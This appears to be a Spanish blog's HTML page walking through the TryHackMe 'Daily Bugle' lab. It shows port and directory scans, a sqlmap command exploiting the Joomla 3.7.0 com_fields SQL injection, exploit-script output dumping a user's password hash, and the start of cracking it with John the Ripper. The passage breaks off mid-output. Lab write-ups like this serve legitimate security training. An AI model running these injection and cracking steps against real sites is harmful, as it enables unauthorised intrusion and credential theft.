@@ -1,0 +1,839 @@
+<!DOCTYPE html>
+<html class="" lang="en"><head>
+    
+    <meta name="viewport" content="width=device-width" />
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=7" />
+
+    <link
+    rel="icon"
+    href='/favicon.png'
+/>
+<link
+    rel="shortcut icon"
+    href='/favicon.ico'
+    type="image/x-icon"
+/>
+<link
+    rel="apple-touch-icon"
+    href='/apple-touch-icon.png'
+/>
+
+    <link
+        rel="icon"
+        href='/logo.svg'
+        type="image/svg+xml"
+    />
+
+<title>
+        
+            Daily Bugle [TryHackMe]  &ndash;
+        
+        K3ssDev
+:/var/log$  
+    </title>
+    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" />
+    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" />
+    
+    
+    <link type="text/css" rel="stylesheet" href=https://k3ssdev.github.io/css/styles.c5c0ca1ad04162d8cbbaa1291d7d0e5d96b9ad04a6b2b68c8ed577d7eabb970ab79d33477f3b13c760eed232f5f642bdcbce1f28bf3f057c36edf5e6c41d203c.css integrity="sha512-xcDKGtBBYtjLuqEpHX0OXZa5rQSmsraMjtV31&#43;q7lwq3nTNHfzsTx2Du0jL19kK9y84fKL8/BXw27fXmxB0gPA==" />
+<meta name="author" content="Alberto Pérez" />
+
+    
+        <meta name="keywords" content='Dirb, gtfobins, Hard, johntheripper, joomla, Linux, Metasploit, Meterpreter, msfvenom, mysql, Privilege Escalation, sqli, sqlmap, TryHackMe, yum' />
+    
+    
+        <meta name="description" content="era sala dificil del path “Offensive Pentesting¨, con una temática de Spiderman. La sala tiene como objetivo comprometer la máquina y obtener las banderas de usuario y root usando una vulnerabilidad de Joomla y un exploit de escalada de privilegios." />
+    
+
+<meta property="og:site_name"
+    content='K3ssDev
+:/var/log$  ' />
+
+    <meta property="og:title" content="Daily Bugle [TryHackMe]" />
+    <meta property="og:type" content="article" />
+    
+    <meta
+        property="article:author" content="Alberto Pérez" />
+    <meta
+        property="article:published_time"
+        content='2023-09-03T00:00:00Z&#43;0000' />
+    
+        
+            <meta property="article:tag" content="Dirb" />
+        
+            <meta property="article:tag" content="gtfobins" />
+        
+            <meta property="article:tag" content="Hard" />
+        
+            <meta property="article:tag" content="johntheripper" />
+        
+            <meta property="article:tag" content="joomla" />
+        
+            <meta property="article:tag" content="Linux" />
+        
+            <meta property="article:tag" content="Metasploit" />
+        
+            <meta property="article:tag" content="Meterpreter" />
+        
+            <meta property="article:tag" content="msfvenom" />
+        
+            <meta property="article:tag" content="mysql" />
+        
+            <meta property="article:tag" content="Privilege Escalation" />
+        
+            <meta property="article:tag" content="sqli" />
+        
+            <meta property="article:tag" content="sqlmap" />
+        
+            <meta property="article:tag" content="TryHackMe" />
+        
+            <meta property="article:tag" content="yum" />
+        
+    
+    <meta property="og:url" content="https://k3ssdev.github.io/posts/daily-bugle/" />
+    <meta property="og:image"
+        content='https://k3ssdev.github.io/images/post_pics/daily-bugle/daily-bugle.png
+        ' />
+    
+        <meta property="og:description" content="Introducción La primera sala dificil del path “Offensive Pentesting¨, con una temática de Spiderman. La sala tiene como objetivo comprometer la máquina y obtene" />
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:domain"
+      content='k3ssdev.github.io'
+/>
+<meta property="twitter:url" content="https://k3ssdev.github.io/posts/daily-bugle/" />
+
+
+    <meta name="twitter:title" content="Daily Bugle [TryHackMe]" />
+    
+    <meta name="twitter:image"
+        content='https://k3ssdev.github.io/images/post_pics/daily-bugle/daily-bugle.png
+        ' />
+    
+        <meta name="twitter:description" content="Introducción La primera sala dificil del path “Offensive Pentesting¨, con una temática de Spiderman. La sala tiene como objetivo comprometer la máquina y obtene" />
+    
+
+<link rel="manifest" href="/manifest/index.json" />
+</head>
+
+
+<body>
+        <div id="baseContainer"><header class="">
+<div class="titleAndSearchContainer">
+        <div id="titleContainer">
+            
+                <a class="unstyledLink" href="/">
+                    <img src='/logo.svg' />
+                </a>
+            
+            <div class="rightOfLogo">
+                <div class="titleAndHamburger">
+                    <h1>
+                        <a class="unstyledLink" href="/">K3ssDev
+:/var/log$  </a>
+                        
+                    </h1>
+                    
+                        <label id="hamburger-menu" for="main-nav-toggler">
+                            &#xf85b;
+                        </label>
+                    
+                </div>
+                <div id="wide_nav"><nav>
+    
+        <input type="checkbox" id="main-nav-toggler" />
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts">Posts</a></li>
+        
+        
+        
+        
+        
+            <li><a href="https://k3ssdev.github.io/pages/about/">
+                About
+            </a></li>
+        
+        
+        
+            <li><a href="/tags">Tags</a></li>
+        
+        
+            <li><a href="/search">Search</a></li>
+        
+    </ul>
+</nav>
+</div>
+            </div>
+        </div>
+        <div class="search">
+    <input id="searchbar" type="text" placeholder='Search' />
+    <a class="nerdlink" onclick="newSearch();">&#xf002;</a>
+</div>
+<script>
+    function newSearch() {
+        let term = searchbar.value.trim();
+        if (!term) return;
+        location.href = `/search?q=${term}`;
+    }
+    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
+</script>
+
+    </div>
+    <div id="links">
+        
+        
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="mailto:k3ssdev@proton.me">
+    
+    
+        &#xf6ed;
+    
+    <span>
+        Email
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://www.linkedin.com/in/alberto-perez-del-rio/">
+    
+    
+        &#xf0e1;
+    
+    <span>
+        Linkedin
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://github.com/k3ssdev">
+    
+    
+        &#xf09b;
+    
+    <span>
+        Github
+    </span>
+</a>
+
+    </div>
+    
+        <div id="sidebar_nav"><nav>
+    
+        <input type="checkbox" id="main-nav-toggler" />
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts">Posts</a></li>
+        
+        
+        
+        
+        
+            <li><a href="https://k3ssdev.github.io/pages/about/">
+                About
+            </a></li>
+        
+        
+        
+            <li><a href="/tags">Tags</a></li>
+        
+        
+            <li><a href="/search">Search</a></li>
+        
+    </ul>
+</nav>
+</div>
+        
+    
+<script src="https://tryhackme.com/badge/1277295"></script>
+
+
+</header>
+<div id="contentContainer">
+                <div id="content">
+                    <main>
+<article class="card single">
+    
+        <h1>Daily Bugle [TryHackMe]</h1>
+    
+    
+        <p class="date">
+            <span title='Date'> </span>
+    2023-09-03
+
+</p>
+    
+    
+    
+        <figure style="margin: 0">
+            <img src="/images/post_pics/daily-bugle/daily-bugle.png" alt="" />
+            
+        </figure>
+    
+    
+    <div><h2 id="introducción">Introducción</h2>
+<p>La primera sala dificil del path “Offensive Pentesting¨, con una temática de Spiderman. La sala tiene como objetivo comprometer la máquina y obtener las banderas de usuario y root usando una vulnerabilidad de Joomla y un exploit de escalada de privilegios.</p>
+<h2 id="task-1---deploy-and-compromise-the-vulnerable-machine">Task 1 - Deploy and compromise the vulnerable machine!</h2>
+<h3 id="paso-1">Paso 1</h3>
+<ul>
+<li>Pongo la máquina en marcha y accedo a la aplicación web que tiene.</li>
+<li>Escaneo la máquina con un nmap en 2 pasos.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sS --min-rate <span style="color:#ae81ff">5000</span> -p- -Pn -v -oN nmap_inicial &lt;IP&gt; 
+</span></span><span style="display:flex;"><span>ports<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>cat nmap_inicial | grep <span style="color:#e6db74">&#39;^[0-9]&#39;</span> | cut -d <span style="color:#e6db74">&#39;/&#39;</span> -f1 | xargs | tr <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#e6db74">&#39;,&#39;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>sudo nmap -p$ports -sC -sV -Pn -oN nmap_final &lt;IP&gt; 
+</span></span></code></pre></div><ul>
+<li>Puertos 22 (OpenSSH 7.4), 80 (Apache httpd 2.4.6 ((CentOS) PHP/5.6.40) y 3306 (mysql).</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh     OpenSSH 7.4 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp   open  http    Apache httpd 2.4.6 <span style="color:#f92672">((</span>CentOS<span style="color:#f92672">)</span> PHP/5.6.40<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.6 <span style="color:#f92672">(</span>CentOS<span style="color:#f92672">)</span> PHP/5.6.40
+</span></span><span style="display:flex;"><span>|_http-title: Home
+</span></span><span style="display:flex;"><span>|_http-generator: Joomla! - Open Source Content Management
+</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#ae81ff">15</span> disallowed entries 
+</span></span><span style="display:flex;"><span>| /joomla/administrator/ /administrator/ /bin/ /cache/ 
+</span></span><span style="display:flex;"><span>| /cli/ /components/ /includes/ /installation/ /language/ 
+</span></span><span style="display:flex;"><span>|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
+</span></span><span style="display:flex;"><span>3306/tcp open  mysql   MariaDB <span style="color:#f92672">(</span>unauthorized<span style="color:#f92672">)</span>
+</span></span></code></pre></div><ul>
+<li>Escaneo con dirb en busca de directorios en la web.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ dirb http://10.10.53.147/ /usr/share/wordlists/dirb/common.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-----------------
+</span></span><span style="display:flex;"><span>DIRB v2.22    
+</span></span><span style="display:flex;"><span>By The Dark Raver
+</span></span><span style="display:flex;"><span>-----------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>START_TIME: Sun Sep  <span style="color:#ae81ff">3</span> 09:14:53 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>URL_BASE: http://10.10.53.147/
+</span></span><span style="display:flex;"><span>WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-----------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GENERATED WORDS: <span style="color:#ae81ff">4612</span>                                                          
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>---- Scanning URL: http://10.10.53.147/ ----
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span>&gt; DIRECTORY: http://10.10.53.147/administrator/                                                                                                                                       
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span>&gt; DIRECTORY: http://10.10.53.147/bin/                                                                                                                                                 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span>&gt; DIRECTORY: http://10.10.53.147/cache/                                                                                                                                               
+</span></span><span style="display:flex;"><span>+ http://10.10.53.147/cgi-bin/ <span style="color:#f92672">(</span>CODE:403|SIZE:210<span style="color:#f92672">)</span>                                                                                                                                      
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span>&gt; DIRECTORY: http://10.10.53.147/components/                                                                                                                                          
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span>&gt; DIRECTORY: http://10.10.53.147/images/                                                                                                                                              
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span>&gt; DIRECTORY: http://10.10.53.147/includes/                                                                                                                                            
+</span></span><span style="display:flex;"><span>+ http://10.10.53.147/index.php <span style="color:#f92672">(</span>CODE:200|SIZE:9278<span style="color:#f92672">)</span>                                                                                                                                    
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span>&gt; DIRECTORY: http://10.10.53.147/language/                                                                                                                                            
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span>&gt; DIRECTORY: http://10.10.53.147/layouts/                                                                                                                                             
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span>&gt; DIRECTORY: http://10.10.53.147/libraries/                                                                                                                                           
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span>&gt; DIRECTORY: http://10.10.53.147/media/                                                                                                                                               
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span>&gt; DIRECTORY: http://10.10.53.147/modules/                                                                                                                                             
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span>&gt; DIRECTORY: http://10.10.53.147/plugins/                                                                                                                                             
+</span></span><span style="display:flex;"><span>+ http://10.10.53.147/robots.txt <span style="color:#f92672">(</span>CODE:200|SIZE:836<span style="color:#f92672">)</span>                                                                                                                                    
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span>&gt; DIRECTORY: http://10.10.53.147/templates/                                                                                                                                           
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span>&gt; DIRECTORY: http://10.10.53.147/tmp/                                                                                                                                                 
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                        
+</span></span><span style="display:flex;"><span>---- Entering directory: http://10.10.53.147/administrator/ ----
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span>&gt; DIRECTORY: http://10.10.53.147/administrator/cache/                                                                                                                                 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span>&gt; DIRECTORY: http://10.10.53.147/administrator/components/                                                                                                                            
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span>&gt; DIRECTORY: http://10.10.53.147/administrator/help/                                                                                                                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span>&gt; DIRECTORY: http://10.10.53.147/administrator/includes/                                                                                                                              
+</span></span><span style="display:flex;"><span>+ http://10.10.53.147/administrator/index.php <span style="color:#f92672">(</span>CODE:200|SIZE:4843<span style="color:#f92672">)</span>                                                                                                                      
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span>&gt; DIRECTORY: http://10.10.53.147/administrator/language/                                                                                                                              
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span>&gt; DIRECTORY: http://10.10.53.147/administrator/logs/                                                                                                                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span>&gt; DIRECTORY: http://10.10.53.147/administrator/modules/                                                                                                                               
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span>&gt; DIRECTORY: http://10.10.53.147/administrator/templates/                                                                                                                             
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                        
+</span></span><span style="display:flex;"><span>---- Entering directory: http://10.10.53.147/bin/ ----
+</span></span><span style="display:flex;"><span>+ http://10.10.53.147/bin/index.html <span style="color:#f92672">(</span>CODE:200|SIZE:31<span style="color:#f92672">)</span>                                                                                                                                 
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                        
+</span></span><span style="display:flex;"><span>---- Entering directory: http://10.10.53.147/cache/ ----
+</span></span><span style="display:flex;"><span>+ http://10.10.53.147/cache/index.html <span style="color:#f92672">(</span>CODE:200|SIZE:31<span style="color:#f92672">)</span>                                                                                                                               
+</span></span><span style="display:flex;"><span>^C&gt; Testing: http://10.10.53.147/cache/lisence
+</span></span></code></pre></div><h3 id="paso-2">Paso 2</h3>
+<ul>
+<li>Busco un scanner para joomla del tipo wpscan. Encuentro  <a href="https://github.com/OWASP/joomscan">https://github.com/OWASP/joomscan</a> y lo instalo desde repositorio de kali. Compruebo que la versión de Joomla es la 3.7.0</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>____  _____  _____  __  __  ___   ___    __    _  _ 
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">(</span>_  _<span style="color:#f92672">)(</span>  _  <span style="color:#f92672">)(</span>  _  <span style="color:#f92672">)(</span>  <span style="color:#ae81ff">\/</span>  <span style="color:#f92672">)</span>/ __<span style="color:#f92672">)</span> / __<span style="color:#f92672">)</span>  /__<span style="color:#ae81ff">\ </span> <span style="color:#f92672">(</span> <span style="color:#ae81ff">\(</span> <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  .-_<span style="color:#f92672">)(</span>   <span style="color:#f92672">)(</span>_<span style="color:#f92672">)(</span>  <span style="color:#f92672">)(</span>_<span style="color:#f92672">)(</span>  <span style="color:#f92672">)</span>    <span style="color:#f92672">(</span> <span style="color:#ae81ff">\_</span>_ <span style="color:#ae81ff">\(</span> <span style="color:#f92672">(</span>__  /<span style="color:#f92672">(</span>__<span style="color:#f92672">)</span><span style="color:#ae81ff">\ </span> <span style="color:#f92672">)</span>  <span style="color:#f92672">(</span> 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">\_</span>___<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>_____<span style="color:#f92672">)(</span>_____<span style="color:#f92672">)(</span>_/<span style="color:#ae81ff">\/\_</span><span style="color:#f92672">)(</span>___/ <span style="color:#ae81ff">\_</span>__<span style="color:#f92672">)(</span>__<span style="color:#f92672">)(</span>__<span style="color:#f92672">)(</span>_<span style="color:#f92672">)</span><span style="color:#ae81ff">\_</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#f92672">(</span>1337.today<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   
+</span></span><span style="display:flex;"><span>    --<span style="color:#f92672">=[</span>OWASP JoomScan
+</span></span><span style="display:flex;"><span>    +---++---<span style="color:#f92672">==[</span>Version : 0.0.7
+</span></span><span style="display:flex;"><span>    +---++---<span style="color:#f92672">==[</span>Update Date : <span style="color:#f92672">[</span>2018/09/23<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    +---++---<span style="color:#f92672">==[</span>Authors : Mohammad Reza Espargham , Ali Razmjoo
+</span></span><span style="display:flex;"><span>    --<span style="color:#f92672">=[</span>Code name : Self Challenge
+</span></span><span style="display:flex;"><span>    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Processing http://10.10.53.147/administrator/ ...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> FireWall Detector
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>++<span style="color:#f92672">]</span> Firewall not detected
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Detecting Joomla Version
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>++<span style="color:#f92672">]</span> Joomla 3.7.0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Core Joomla Vulnerability
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>++<span style="color:#f92672">]</span> Target Joomla core is not vulnerable
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Checking Directory Listing
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>++<span style="color:#f92672">]</span> directory has directory listing : 
+</span></span><span style="display:flex;"><span>http://10.10.53.147/administrator/components
+</span></span><span style="display:flex;"><span>http://10.10.53.147/administrator/modules
+</span></span><span style="display:flex;"><span>http://10.10.53.147/administrator/templates
+</span></span><span style="display:flex;"><span>http://10.10.53.147/administrator/includes
+</span></span><span style="display:flex;"><span>http://10.10.53.147/administrator/language
+</span></span><span style="display:flex;"><span>http://10.10.53.147/administrator/templatesll
+</span></span></code></pre></div><ul>
+<li>Encuentro varias vulnerabilidades para la versio 3.7 de Joomla.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ searchsploit joomla 3.7 -w
+</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
+</span></span><span style="display:flex;"><span> Exploit Title                                                                                                                              |  URL
+</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
+</span></span><span style="display:flex;"><span>Joomla! 3.7 - SQL Injection                                                                                                                 | https://www.exploit-db.com/exploits/44227
+</span></span><span style="display:flex;"><span>Joomla! 3.7.0 - <span style="color:#e6db74">&#39;com_fields&#39;</span> SQL Injection                                                                                                  | https://www.exploit-db.com/exploits/42033
+</span></span><span style="display:flex;"><span>Joomla! Component ARI Quiz 3.7.4 - SQL Injection                                                                                            | https://www.exploit-db.com/exploits/46769
+</span></span><span style="display:flex;"><span>Joomla! Component com_realestatemanager 3.7 - SQL Injection                                                                                 | https://www.exploit-db.com/exploits/38445
+</span></span><span style="display:flex;"><span>Joomla! Component Easydiscuss &lt; 4.0.21 - Cross-Site Scripting                                                                               | https://www.exploit-db.com/exploits/43488
+</span></span><span style="display:flex;"><span>Joomla! Component J2Store &lt; 3.3.7 - SQL Injection                                                                                           | https://www.exploit-db.com/exploits/46467
+</span></span><span style="display:flex;"><span>Joomla! Component JomEstate PRO 3.7 - <span style="color:#e6db74">&#39;id&#39;</span> SQL Injection                                                                                    | https://www.exploit-db.com/exploits/44117
+</span></span><span style="display:flex;"><span>Joomla! Component Jtag Members Directory 5.3.7 - Arbitrary File Download                                                                    | https://www.exploit-db.com/exploits/43913
+</span></span><span style="display:flex;"><span>Joomla! Component Quiz Deluxe 3.7.4 - SQL Injection                                                                                         | https://www.exploit-db.com/exploits/42589
+</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
+</span></span><span style="display:flex;"><span>Shellcodes: No Results
+</span></span></code></pre></div><ul>
+<li>Encuentro un posible exploit en <a href="https://www.exploit-db.com/exploits/42033">https://www.exploit-db.com/exploits/42033</a></li>
+<li>Ataco con SQLi usando sqlmap.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://10.10.53.147/administrator/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --random-agent --dbs -p list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]</span>
+</span></span></code></pre></div><ul>
+<li>Otra opción es el script <a href="https://github.com/incredibleindishell/exploit-code-by-me/tree/43f3976ee02430762bbe02642dc8df82385b7cca/Joomla-SQL-Injection-3.7">https://github.com/incredibleindishell/exploit-code-by-me/tree/43f3976ee02430762bbe02642dc8df82385b7cca/Joomla-SQL-Injection-3.7</a></li>
+<li>Busca una tercera opcion valida, encuentro el script  <a href="https://github.com/stefanlucas/Exploit-Joomla">https://github.com/stefanlucas/Exploit-Joomla</a></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ python2 joomblah.py http://10.10.53.147
+</span></span><span style="display:flex;"><span>                                                                                                                    
+</span></span><span style="display:flex;"><span>    .---.    .-<span style="color:#e6db74">&#39;&#39;&#39;-.        .-&#39;&#39;&#39;</span>-.                                                           
+</span></span><span style="display:flex;"><span>    |   |   <span style="color:#e6db74">&#39;   _    \     &#39;</span>   _    <span style="color:#ae81ff">\ </span>                           .---.                        
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;---&#39;</span> /   /<span style="color:#e6db74">`</span> <span style="color:#e6db74">&#39;.   \  /   /` &#39;</span>.   <span style="color:#ae81ff">\ </span> __  __   ___   /|        |   |            .           
+</span></span><span style="display:flex;"><span>    .---..   |     <span style="color:#ae81ff">\ </span> <span style="color:#e6db74">&#39; .   |     \  &#39;</span> |  |/  <span style="color:#e6db74">`</span>.<span style="color:#e6db74">&#39;   `. ||        |   |          .&#39;</span>|           
+</span></span><span style="display:flex;"><span>    |   <span style="color:#f92672">||</span>   <span style="color:#e6db74">&#39;      |  &#39;</span>|   <span style="color:#e6db74">&#39;      |  &#39;</span>|   .-.  .-.   <span style="color:#e6db74">&#39;||        |   |         &lt;  |           
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    |   | `.   ` ..&#39;</span> /   <span style="color:#e6db74">`</span>.   <span style="color:#e6db74">`</span> ..<span style="color:#e6db74">&#39; /  |  |  |  |  |  |||/&#39;</span>__ <span style="color:#e6db74">&#39;. |   | .:--.&#39;</span>.  | | .<span style="color:#e6db74">&#39;&#39;&#39;-.    
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    |   |    &#39;</span>-...-<span style="color:#e6db74">&#39;`       &#39;</span>-...-<span style="color:#e6db74">&#39;`   |  |  |  |  |  ||:/`  &#39;</span>. <span style="color:#e6db74">&#39;|   |/ |   \ | | |/.&#39;&#39;&#39;</span>. <span style="color:#ae81ff">\ </span>  
+</span></span><span style="display:flex;"><span>    |   |                              |  |  |  |  |  <span style="color:#f92672">||</span>|     | <span style="color:#f92672">||</span>   |<span style="color:#e6db74">`</span><span style="color:#e6db74">&#34; __ | | |  /    | |   
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    |   |                              |__|  |__|  |__|||\    / &#39;|   | .&#39;.&#39;&#39;| | | |     | |   
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> __.&#39;   &#39;                                              |/&#39;..&#39; / &#39;---&#39;/ /   | |_| |     | |   
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|      &#39;                                               &#39;  `&#39;-&#39;`       \ \._,\ &#39;/| &#39;.    | &#39;.  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|____.&#39;                                                                `--&#39;  `&#34;</span> <span style="color:#e6db74">&#39;---&#39;</span>   <span style="color:#e6db74">&#39;---&#39;</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching CSRF token
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Testing SQLi
+</span></span><span style="display:flex;"><span>  -  Found table: fb9j5_users
+</span></span><span style="display:flex;"><span>  -  Extracting users from fb9j5_users
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">[</span>$<span style="color:#f92672">]</span> Found user <span style="color:#f92672">[</span>u<span style="color:#e6db74">&#39;811&#39;</span>, u<span style="color:#e6db74">&#39;Super User&#39;</span>, u<span style="color:#e6db74">&#39;jonah&#39;</span>, u<span style="color:#e6db74">&#39;jonah@tryhackme.com&#39;</span>, u<span style="color:#e6db74">&#39;$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm&#39;</span>, u<span style="color:#e6db74">&#39;&#39;</span>, u<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>  -  Extracting sessions from fb9j5_session
+</span></span></code></pre></div><ul>
+<li>Uso john the ripper con el hash obtenido. Password → spiderman123</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ john password.txt --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>bcrypt <span style="color:#f92672">[</span>Blowfish 32/64 X3<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">1024</span> <span style="color:#66d9ef">for</span> all loaded hashes
